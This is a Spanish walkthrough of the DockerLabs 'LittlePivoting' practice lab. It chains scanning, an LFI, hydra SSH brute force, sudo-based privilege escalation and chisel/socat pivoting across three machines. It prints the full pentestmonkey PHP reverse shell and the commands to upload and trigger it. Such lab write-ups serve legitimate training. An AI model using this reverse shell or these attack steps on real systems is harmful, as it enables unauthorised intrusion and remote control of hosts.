# LittlePivoting

Máquina vulnerable en modo **medium** de Dockerlabs.

---

## 🔎 Reconocimiento

Las máquinas objetivo se encuentran correctamente desplegadas dentro de la red de laboratorio (en este caso, utilizando Docker).

![Reconocimiento](https://i.imgur.com/mgJb6qY.png)

![Reconocimiento](https://i.imgur.com/XcNbbPV.png)

Se utilizó el comando `arp-scan` utilizando la interfaz generada por docker para identificar los dispositivos conectados a la red de manera local. Dando como resultado una máquina disponible, con la ip `10.10.10.2`

```bash
> sudo arp-scan -I br-dcb58c6fa435 --localnet
Interface: br-dcb58c6fa435, type: EN10MB, MAC: 02:42:f4:9f:36:7b, IPv4: 10.10.10.1
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.10.10.2	02:42:0a:0a:0a:02	(Unknown: locally administered)

1 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.966 seconds (130.21 hosts/sec). 1 responded
```

---

## 📡 Escaneo **_trust_**

Se realizó un escaneo con **Nmap** para identificar puertos abiertos y servicios en la **maquina trust**:

```bash
nmap -p- --open -sC -sV --min-rate 5000 -n -Pn 10.10.10.2
```

Resultados principales:

```
# Nmap scan report for 10.10.10.2
Host is up (0.0000090s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   256 19:a1:1a:42:fa:3a:9d:9a:0f:ea:91:7f:7e:db:a3:c7 (ECDSA)
|_  256 a6:fd:cf:45:a6:95:05:2c:58:10:73:8d:39:57:2b:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 02:42:0A:0A:0A:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.68 seconds
```

---

## 📂 Enumeración **_trust_**

Se hizo una inspección del sitio web en el puerto **80** y se identificó un servidor apache en el index, se procedió a realizar un discovery de directorios con gobuster.

```bash
gobuster dir -u "http://10.10.10.2"   -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt   -t 20 -x php,txt,html,php.bak
```

```
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.2
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              txt,html,php.bak,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html          [32m (Status: 200)[0m [Size: 10701]
/secret.php          [32m (Status: 200)[0m [Size: 927]
/server-status       [33m (Status: 403)[0m [Size: 275]
Progress: 1102785 / 1102785 (100.00%)
===============================================================
Finished
===============================================================

```

La única página que pareció tener información relevante fue la de `secret.php` el cual arrojó datos de un posible usuario llamado **mario**

![Scan1](https://i.imgur.com/zwXv23k.png)

Al no encontrar otra información que se considerara relevante, se procedió a realizar un ataque de brute force con **hydra** al ssh usando el usuario mario y los resultados fueron positivos.

```bash
> hydra -t 4 -l mario -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.2
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-06 11:21:58
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://10.10.10.2:22/
[22][ssh] host: 10.10.10.2   login: mario   password: chocolate
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-06 11:22:23
```

---

## 💥 Explotación **_trust_**

Con las credenciales obtenidas se realiza el proceso de explotación ingresando a la terminal por medio del puerto abierto con ssh, el resultado fue el siguiente:

![Werkzeug1](https://i.imgur.com/BxtqCua.png)

---

## 🔝 Escalación de privilegios **_trust_**

Se analizó el entorno para validar cómo conseguir la escalada de privilegios. Por lo que se buscaron binarios con permisos SUID:

```bash
find / -perm -4000 2>/dev/null
```

![SUID](https://i.imgur.com/grvujc8.png)

Al tener disponible `/usr/bin/vim` para ejecutar con sudo, se revisó [GTFObins](https://gtfobins.github.io/gtfobins/vim/) para escalar privilegios con este binario y por medio del comando `:!/bin/sh` se puede alcanzar el root.

![SUID](https://i.imgur.com/kttYaL3.png)

Al obtener el usuario root, lo siguiente fue hacer un recon con `hostname -I` para identificar los host disponibles dentro de la red y el resultado fue:

```bash
hostname -I
10.10.10.2 20.20.20.2
```

Se desarrolló un pequeño script en base a un análisis básico de hosts pasando tres optetos como base y se mandó a la máquina trust para ejecutar el reconocimiento al igual que **chisel** el cual es una herramienta de tunelización para establecer la comunicación entre máquinas el cuál puede ser revisado desde [aquí](https://github.com/jpillora/chisel).

**hostScanner.sh**

```bash
#!/bin/bash

if [ -z "$1" ]; then
	echo "Use: $0 <prefix>"
	echo "Sample: $0 20.20.20"
fi

PREFIX=$1

for host in $(seq 1 200); do
	timeout 1 bash -c "ping -c 1 ${PREFIX}.$host &>/dev/null" \ && echo "\U0001f43e HOST FOUND - ${PREFIX}.$host"
done
wait

```

NOTA: Importante que al tenerlo en la máquina victima `chmod +x` para otorgar permisos de ejecución.

![SUID](https://i.imgur.com/7v8BUdK.png)

Desde aquí hubo un pequeño problema de **_command not found_** al ejecutar en bash el `ping` por lo que con una simple instalación sudo apt install iputils-ping o `sudo apt install iputils-ping` o `sudo apt install inetutils-ping` solucionó el problema, luego se ejecutó el hostScanner y se encontraron los siguientes hosts al alcance:

```bash
./hostScanner.sh 20.20.20
🐾 HOST FOUND - 20.20.20.2
🐾 HOST FOUND - 20.20.20.3
```

![SUID](https://i.imgur.com/MN4R7hG.png)

#### 📍 Tunneling (trust -> kali)

Al haber identificado una segunda máquina dentro de los hosts de la máquina **_trust_** se creó un tunel que nos permita alcanzar esa segunda máquina desde la atacante

- La máquina atacante (kali) ejecuta el chisel en modo server para abrir la conexión con el puerto **3434**.
  ![SUID](https://i.imgur.com/PoLSGlm.png)

- La máquina **_trust_** ejecuta chisel en modo cliente para establecer el tunel, así la máquina atacante puede 'alcanzar' a la máquina **_inclusion_** 20.20.20.3 por medio de proxychains.
  ![SUID](https://i.imgur.com/pwDirmh.png)

- Se configuraron las proxychains para recibir las conexiones del chisel por medio del puerto **1080** por lo que se editó el archivo `/etc/proxychains4.conf`
  ![SUID](https://i.imgur.com/nWspCI4.png)
  Importante tener descomentada solo la última línea `127.0.0.1 1080` y el tipo de chain en `strict_chain`

- Con la tool de **socat** se coloca en escucha por el puerto **1111** para que en un futuro pueda recibir información de otra máquina y a su vez enviarla al puerto **3434** de la máquina kali.
  ![SUID](https://i.imgur.com/G2q5tfG.png)

## 📡 Escaneo **_inclusion_**

Se inició un escaneo con **Nmap** esta vez utilizando proxychains, donde se determinó que el host estaba arriba pero no se pudieron analizar los puertos.

![SUID](https://i.imgur.com/XitUA6D.png)

Se hizo una configuración en proxys para el navegador y se intentó acceder desde la web y el resultado fue positivo, otro servidor de apache.

![SUID](https://i.imgur.com/tNcKhct.png)
![SUID](https://i.imgur.com/XELdenf.png)

## 📂 Enumeración **_inclusion_**

Para encontrar directorios ocultos, se empleó **dirb** para hacer un recon rápido el cual arrojó los siguientes resultados:

```bash
> proxychains4 dirb http://20.20.20.3 2>/dev/null

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Wed Oct  8 15:48:30 2025
URL_BASE: http://20.20.20.3/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://20.20.20.3/ ----
+ http://20.20.20.3/index.html (CODE:200|SIZE:10701)
+ http://20.20.20.3/server-status (CODE:403|SIZE:275)
==> DIRECTORY: http://20.20.20.3/shop/

---- Entering directory: http://20.20.20.3/shop/ ----
+ http://20.20.20.3/shop/index.php (CODE:200|SIZE:1112)

-----------------
END_TIME: Wed Oct  8 15:48:37 2025
DOWNLOADED: 9224 - FOUND: 3
```

Inspeccionando la url de `/shop` se detecto una posible vulnerabilidad de **LFI** o **Local File Inclusion** lo cual se decide testear por medio de fuzzing, en esta ocasión con la herramienta **wfuzz**.

![Shop](https://i.imgur.com/YjOZ0Kb.png)

```bash
> proxychains wfuzz -u 'htt://20.20.20.3/shop/index.php?archivo=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
```

![Wfuzz](https://i.imgur.com/Y1yVo4n.png)
![Wfuzz](https://i.imgur.com/KRXf5xo.png)

## 💥 Explotación **_inclusion_**

Despues de varios intentos con algunos paths se consiguió explotar la vulnerabilidad que revela la lista de usuarios.

![Shop](https://i.imgur.com/PJRUPyI.png)

Lo siguiente fue probar con brute force empleando **hydra** para empezar a descifrar contraseñas de los usuarions que manejen el bash, como `manchi` o `seller` para acceder por ssh.

```bash
> proxychains hydra -t 4 -l manchi -P /usr/share/wordlists/rockyou.txt ssh://20.20.20.3
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-08 17:25:24
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://20.20.20.3:22/
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  20.20.20.3:22  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080 [proxychains] Strict chain  ...  127.0.0.1:1080  ...  20.20.20.3:22 [proxychains] Strict chain  ...  127.0.0.1:1080  ...  20.20.20.3:22  ...  20.20.20.3:22 [proxychains] Strict chain  ...  127.0.0.1:1080  ...  20.20.20.3:22  ...  OK
 ...  OK
 ...  OK
 ...  OK
[22][ssh] host: 20.20.20.3   login: manchi   password: lovely
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-08 17:25:36
```

Con las credenciales descubiertas se puede acceder con proxychains al ssh de la máquina inclusión 20.20.20.3

![Wfuzz](https://i.imgur.com/1djhJld.png)

#### 📍 Tunneling (inclusion -> kali)

- Dentro de la máquina **inclusion** con el usuario `manchi` se vuelve a implementar el comando `hostname -I` para encontrar los hosts y luego se puede ejecutar el script de **_hostScanner.sh_** para empezar a reconocer host a la máquina, el cual nos permite detectar la máquina **_upload_**.

```bash
hostname -I
20.20.20.2 30.30.30.2
```

```bash
./hostScanner.sh 30.30.30
🐾 HOST FOUND - 30.30.30.2
🐾 HOST FOUND - 30.30.30.3
```

- Se ejecuta el chisel client para enviar a la máquina **trust** que escucha con **socat** usando el puerto **1111** que a su vez tunelea el tráfico a la máquina kali con el puerto **8090** para pasar nuevamente socks en lugar de algún puerto específico, esto permite a la máquina atacante (kali) poder alcanzar a la máquina **upload**.
  ![Wfuzz](https://i.imgur.com/U6Jd44l.png)

- El server de chisel desde la máquina kali empieza a escuchar la nueva conexión por medio del túnel.
  ![Wfuzz](https://i.imgur.com/zDrJBG3.png)

- Se agregó `127.0.0.1 8090` en el archivo de proxychains junto a la anterior, cambiando también el tipo de chain a `dynamic_chain`.

## 📡 Escaneo **_upload_**

Se procede a ejecutar un _Nmap_ al nuevo host encontrado 30.30.30.3 sin embargo no se encontraron resultados, para detectar que el server is up.

## 📂 Enumeración **_upload_**

Accediendo al host desde la web se obtiene una web para subir archivos.

![Upload](https://i.imgur.com/13VxPFS.png)

Se vuelve a realizar un análisis de directorios con **dirb** y se encuentra un solo directorio.

```bash
> proxychains dirb 'http://30.30.30.3' 2>/dev/null

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Wed Oct  8 20:22:19 2025
URL_BASE: http://30.30.30.3/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://30.30.30.3/ ----
+ http://30.30.30.3/index.html (CODE:200|SIZE:1361)
+ http://30.30.30.3/server-status (CODE:403|SIZE:275)
==> DIRECTORY: http://30.30.30.3/uploads/

---- Entering directory: http://30.30.30.3/uploads/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

-----------------
END_TIME: Wed Oct  8 20:22:22 2025
DOWNLOADED: 4612 - FOUND: 2

```

#### 📍 Tunneling (upload -> inclusion -> trust -> kali)

Para hacer port forwarding entre la máquina **upload** y la máquina atacante se pasó utilizando socat como port forwader para abrir el puerto 443 y ejecutar una revershe shell desde la máquina **upload**

- En nueva sesión con ssh, la máquina **inclusion** se puso a la escucha del puerto **443** y así mismo redirige el tráfico a la máquina **trust**
  ![Wfuzz](https://i.imgur.com/4WNcFKK.png)
- En otra sesión con ssh, la máquina **trust** se puso a la escucha del puerto **443**, es decir recibe tráfico desde la máquina **inclusion** y a su vez lo redirige a la máquina atacante.
  ![Wfuzz](https://i.imgur.com/L944HFz.png)

## 💥 Explotación **_upload_**

Ingresando a `/uploads` desde la web se pudo concluir de que hay una vulnerabilidad de Unrestricted File Upload que podría ser explotada.

![Upload](https://i.imgur.com/E1kmvMg.png)

Se probaron con diferentes archivos de reverse shells escritos en php, python. A continuación se adjunta el script que funcionó.

**reverse_shell_pentestmonkey.php**

```bash
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '30.30.30.2';  // CHANGE THIS
$port = 443;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();

	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}

	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

Se carga el fichero con la ip y el puerto de la máquina atacante y se ingresa a uploads con el nombre del mismo para ejecutar la reverse shell, que debería pasar por entre las dos máquinas previas a **upload**, teniendo en cuenta que antes se debe poner a la escucha desde la máquina atacante.

```bash
sudo nc -nlvp 443
```

![Upload](https://i.imgur.com/ufgP6nF.png)

![Upload](https://i.imgur.com/G4Rh85z.png)

Si todos los túneles está correctamente implementados el reverse shell desde **upload** a la máquina atacante debería llegar sin problemas.

## 🔝 Escalación de privilegios **_upload_**

Lo siguiente es escalar los privilegios por lo que se detecta buscando binarios que el usuario puede ejecutar `/usr/bin/env` por lo que se pudo escalar privilegios abusando del mismo, en [GTFObins](https://gtfobins.github.io/gtfobins/env/) se puede leer más a detalle.

![Upload](https://i.imgur.com/7GivQNZ.png)

Con esto se consigue vulnerar la máquina final.
